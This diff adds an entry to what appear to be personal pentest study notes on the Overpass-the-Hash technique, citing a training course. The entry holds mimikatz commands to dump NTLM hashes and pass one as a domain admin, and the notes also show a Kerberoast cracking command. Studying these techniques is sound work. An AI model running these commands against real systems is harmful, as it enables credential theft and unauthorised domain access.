@@ -2188,6 +2188,16 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile>
 *** Overpass the Hash
     + docs 
       - [[https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf]] 
+    + win 10 will temporarily cache credentials after an successful UAC (e.g. run as Administrator -> Run as different user).
+    + src:
+    #+begin_src powershell
+    ...
+    mimikatz # sekurlsa::logonpasswords
+      ## \* NTLM : e2b475c11da2a0748290d87aa966c327
+    mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe 
+      ## the domain is Kerberos domain?
+    (PWK p659)
+    #+end_src 
       
 
 * TODO list
